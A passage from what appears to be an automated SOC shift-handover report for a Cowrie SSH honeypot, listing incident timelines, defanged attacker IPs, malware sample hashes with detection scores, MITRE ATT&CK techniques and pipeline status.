| `2026-06-01 11:26:56` | `cowrie.command.input` |
| `2026-06-01 11:26:56` | `cowrie.command.failed` |
| `2026-06-01 11:26:56` | `cowrie.log.closed` |
| `2026-06-01 11:26:56` | `cowrie.session.params` |
| `2026-06-01 11:26:56` | `cowrie.command.input` |
| `2026-06-01 11:26:56` | `cowrie.session.file_download` |
| `2026-06-01 11:26:56` | `cowrie.log.closed` |
| `2026-06-01 11:26:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.100.254[.]191` to AbuseIPDB if not already reported
- [ ] Block `34.100.254[.]191` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14363c5a0980

| Field | Detail |
|---|---|
| **Source IP** | `34.100.254[.]191` |
| **First Seen** | 2026-06-01 11:26 |
| **Last Seen** | 2026-06-01 11:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 11:26:57` | `cowrie.session.connect` |
| `2026-06-01 11:26:57` | `cowrie.client.version` |
| `2026-06-01 11:26:57` | `cowrie.client.kex` |
| `2026-06-01 11:26:57` | `cowrie.login.success` |
| `2026-06-01 11:26:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.100.254[.]191` to AbuseIPDB if not already reported
- [ ] Block `34.100.254[.]191` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `159.203.20[.]239` | **428** | 2026-06-01 04:23 | 2026-06-01 11:40 | 280m | 0 | `T1592` | 🟠 MEDIUM |
| `68.183.202[.]252` | **150** | 2026-06-01 04:36 | 2026-06-01 11:38 | 138m | 0 | `T1592` | 🟠 MEDIUM |
| `223.123.38[.]120` | **25** | 2026-06-01 10:03 | 2026-06-01 10:08 | 5m | 0 | `T1592` | 🟠 MEDIUM |
| `121.15.140[.]235` | **20** | 2026-06-01 06:57 | 2026-06-01 07:22 | 34m | 3 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `187.212.47[.]18` | **18** | 2026-06-01 09:38 | 2026-06-01 10:09 | 0m | 18 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `114.254.1[.]141` | **17** | 2026-06-01 04:32 | 2026-06-01 04:44 | 27m | 2 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `114.80.32[.]225` | **16** | 2026-06-01 10:16 | 2026-06-01 10:27 | 30m | 1 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `118.39.234[.]65` | **15** | 2026-06-01 05:13 | 2026-06-01 05:41 | 0m | 15 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `122.13.25[.]186` | **15** | 2026-06-01 10:03 | 2026-06-01 10:16 | 26m | 2 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `34.100.254[.]191` | **15** | 2026-06-01 10:55 | 2026-06-01 11:28 | 0m | 15 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `34.78.29[.]97` | **15** | 2026-06-01 05:13 | 2026-06-01 05:35 | 0m | 15 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `40.121.200[.]75` | **15** | 2026-06-01 05:12 | 2026-06-01 05:40 | 0m | 15 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `64.188.77[.]26` | **15** | 2026-06-01 05:17 | 2026-06-01 05:37 | 0m | 15 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `104.28.233[.]73` | **13** | 2026-06-01 05:10 | 2026-06-01 05:48 | 0m | 11 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `71.80.194[.]137` | **10** | 2026-06-01 07:20 | 2026-06-01 07:38 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `198.154.207[.]145` | **9** | 2026-06-01 09:46 | 2026-06-01 10:04 | 0m | 9 | `T1110.001 · T1592` | 🟢 LOW |
| `106.75.12[.]239` | **8** | 2026-06-01 07:28 | 2026-06-01 07:28 | 0m | 2 | `T1110.001` | 🟢 LOW |
| `138.197.200[.]106` | **7** | 2026-06-01 06:54 | 2026-06-01 07:25 | 0m | 7 | `T1110.001 · T1592` | 🟢 LOW |
| `124.164.251[.]88` | **6** | 2026-06-01 07:21 | 2026-06-01 07:25 | 3m | 4 | `T1110.001 · T1592` | 🟢 LOW |
| `47.77.238[.]211` | **6** | 2026-06-01 09:32 | 2026-06-01 09:32 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]186` | **4** | 2026-06-01 08:34 | 2026-06-01 08:35 | 0m | 0 | `T1592` | 🟢 LOW |
| `135.237.127[.]71` | **2** | 2026-06-01 11:08 | 2026-06-01 11:09 | 0m | 0 | `T1592` | 🟢 LOW |
| `163.53.168[.]23` | **2** | 2026-06-01 05:11 | 2026-06-01 05:13 | 4m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `172.191.151[.]49` | **2** | 2026-06-01 06:40 | 2026-06-01 07:34 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `195.96.139[.]157` | **2** | 2026-06-01 05:50 | 2026-06-01 05:50 | 0m | 0 | `T1592` | 🟢 LOW |
| `199.45.154[.]113` | **2** | 2026-06-01 05:37 | 2026-06-01 05:37 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]191` | **2** | 2026-06-01 06:06 | 2026-06-01 06:07 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]121` | **2** | 2026-06-01 08:12 | 2026-06-01 08:12 | 0m | 0 | `T1592` | 🟢 LOW |
| `77.90.185[.]46` | **2** | 2026-06-01 04:52 | 2026-06-01 04:52 | 0m | 7 | `T1110.001` | 🟢 LOW |
| `1.214.179[.]202` | 1 | 2026-06-01 10:17 | 2026-06-01 10:18 | 30s | 0 | `T1592` | 🟢 LOW |
| `101.100.156[.]227` | 1 | 2026-06-01 04:39 | 2026-06-01 04:39 | 13s | 0 | `T1592` | 🟢 LOW |
| `101.126.157[.]138` | 1 | 2026-06-01 11:00 | 2026-06-01 11:00 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `101.79.167[.]192` | 1 | 2026-06-01 11:38 | 2026-06-01 11:38 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `102.88.137[.]145` | 1 | 2026-06-01 09:29 | 2026-06-01 09:29 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `102.88.137[.]80` | 1 | 2026-06-01 09:31 | 2026-06-01 09:31 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.175.225[.]238` | 1 | 2026-06-01 05:25 | 2026-06-01 05:25 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.203.57[.]19` | 1 | 2026-06-01 11:40 | 2026-06-01 11:40 | 5s | 0 | `T1592` | 🟢 LOW |
| `106.75.222[.]86` | 1 | 2026-06-01 09:41 | 2026-06-01 09:43 | 120s | 0 | `T1592` | 🟢 LOW |
| `111.72.213[.]167` | 1 | 2026-06-01 10:17 | 2026-06-01 10:18 | 30s | 0 | `T1592` | 🟢 LOW |
| `113.161.222[.]150` | 1 | 2026-06-01 07:40 | 2026-06-01 07:40 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `113.31.115[.]157` | 1 | 2026-06-01 09:37 | 2026-06-01 09:39 | 120s | 0 | `T1592` | 🟢 LOW |
| `116.125.120[.]27` | 1 | 2026-06-01 06:42 | 2026-06-01 06:42 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `118.145.228[.]55` | 1 | 2026-06-01 04:33 | 2026-06-01 04:35 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.193.44[.]184` | 1 | 2026-06-01 11:04 | 2026-06-01 11:04 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `118.196.26[.]28` | 1 | 2026-06-01 11:00 | 2026-06-01 11:02 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.26.110[.]171` | 1 | 2026-06-01 10:04 | 2026-06-01 10:04 | 0s | 0 | `T1592` | 🟢 LOW |
| `120.1.87[.]115` | 1 | 2026-06-01 06:38 | 2026-06-01 06:40 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.240.236[.]178` | 1 | 2026-06-01 05:10 | 2026-06-01 05:12 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.240.236[.]178` | 1 | 2026-06-01 11:02 | 2026-06-01 11:04 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.241.79[.]66` | 1 | 2026-06-01 06:01 | 2026-06-01 06:02 | 60s | 1 | `T1110.001` | 🟢 LOW |
| `120.48.154[.]88` | 1 | 2026-06-01 05:17 | 2026-06-01 05:17 | 2s | 0 | `T1592` | 🟢 LOW |
| `120.48.22[.]91` | 1 | 2026-06-01 06:47 | 2026-06-01 06:49 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.33[.]21` | 1 | 2026-06-01 11:25 | 2026-06-01 11:27 | 120s | 0 | `T1592` | 🟢 LOW |
| `135.148.33[.]168` | 1 | 2026-06-01 05:20 | 2026-06-01 05:21 | 33s | 0 | `T1592` | 🟢 LOW |
| `139.19.117[.]130` | 1 | 2026-06-01 06:36 | 2026-06-01 06:36 | 10s | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `139.19.117[.]130` | 1 | 2026-06-01 11:36 | 2026-06-01 11:36 | 10s | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `14.103.107[.]209` | 1 | 2026-06-01 09:30 | 2026-06-01 09:32 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.111[.]110` | 1 | 2026-06-01 04:39 | 2026-06-01 04:41 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.115[.]141` | 1 | 2026-06-01 09:29 | 2026-06-01 09:31 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.126[.]104` | 1 | 2026-06-01 09:38 | 2026-06-01 09:40 | 120s | 0 | `T1592` | 🟢 LOW |
| `153.99.92[.]11` | 1 | 2026-06-01 06:36 | 2026-06-01 06:38 | 120s | 0 | `T1592` | 🟢 LOW |
| `161.49.89[.]39` | 1 | 2026-06-01 07:04 | 2026-06-01 07:04 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `171.104.143[.]176` | 1 | 2026-06-01 11:38 | 2026-06-01 11:40 | 120s | 0 | `T1592` | 🟢 LOW |
| `18.144.3[.]82` | 1 | 2026-06-01 05:12 | 2026-06-01 05:12 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `180.106.83[.]59` | 1 | 2026-06-01 07:51 | 2026-06-01 07:53 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.76.105[.]69` | 1 | 2026-06-01 05:59 | 2026-06-01 06:01 | 120s | 0 | `T1592` | 🟢 LOW |
| `183.221.0[.]223` | 1 | 2026-06-01 07:12 | 2026-06-01 07:14 | 120s | 0 | `T1592` | 🟢 LOW |
| `183.94.33[.]245` | 1 | 2026-06-01 06:38 | 2026-06-01 06:40 | 120s | 0 | `T1592` | 🟢 LOW |
| `196.204.71[.]189` | 1 | 2026-06-01 11:38 | 2026-06-01 11:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `206.135.161[.]27` | 1 | 2026-06-01 04:28 | 2026-06-01 04:29 | 12s | 0 | `T1592` | 🟢 LOW |
| `42.51.42[.]209` | 1 | 2026-06-01 09:29 | 2026-06-01 09:31 | 120s | 0 | `T1592` | 🟢 LOW |
| `43.108.39[.]123` | 1 | 2026-06-01 07:02 | 2026-06-01 07:02 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `43.224.126[.]107` | 1 | 2026-06-01 07:03 | 2026-06-01 07:05 | 120s | 0 | `T1592` | 🟢 LOW |
| `5.226.140[.]74` | 1 | 2026-06-01 06:27 | 2026-06-01 06:27 | 9s | 0 | `T1592` | 🟢 LOW |
| `58.72.124[.]213` | 1 | 2026-06-01 07:27 | 2026-06-01 07:27 | 12s | 0 | `T1592` | 🟢 LOW |
| `64.188.83[.]134` | 1 | 2026-06-01 09:37 | 2026-06-01 09:37 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `64.227.101[.]30` | 1 | 2026-06-01 11:27 | 2026-06-01 11:27 | 35s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]135` | 1 | 2026-06-01 10:21 | 2026-06-01 10:21 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.240.236[.]109` | 1 | 2026-06-01 07:54 | 2026-06-01 07:54 | 10s | 0 | `T1592` | 🟢 LOW |
| `77.231.248[.]8` | 1 | 2026-06-01 08:28 | 2026-06-01 08:30 | 120s | 0 | `T1592` | 🟢 LOW |
| `92.30.242[.]95` | 1 | 2026-06-01 08:14 | 2026-06-01 08:14 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `120.48.22[.]91` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 7 |
| `223.123.38[.]120` | PK | CMPak Limited | **100** ⚠️ | 4 |
| `64.227.101[.]30` | US | DigitalOcean, LLC | **100** ⚠️ | 0 |
| `172.191.151[.]49` | US | Microsoft Limited | **100** ⚠️ | 0 |
| `43.224.126[.]107` | LK | Lanka Government Cloud | **100** ⚠️ | 50 |
| `106.75.12[.]239` | CN | Shanghai UCloud Information Technology Company Limited | **100** ⚠️ | 33 |
| `68.183.202[.]252` | CA | DigitalOcean, LLC | **100** ⚠️ | 0 |
| `40.121.200[.]75` | US | Microsoft Corporation | **100** ⚠️ | 40 |
| `118.196.26[.]28` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 17 |
| `66.240.236[.]109` | US | CariNet, Inc. | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 396 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 171 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 164 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 86 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 86 |

---

## 🔕 False Positive Summary (69 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 2 |
| AbuseIPDB score 16 below threshold 25 | 10 |
| AbuseIPDB score 24 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 54 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 1135 cases |
| Tool 34  | Credential Extractor        | ✅ 343 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 11 fingerprints |
| Tool 36  | Command Clustering          | ✅ 4 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 92 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 69 filtered (6.1%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 54 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 171 priority case(s) shown individually · 81 recon entry/entries in table (29 group(s) consolidating 843 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-06-01T11:42:52Z_
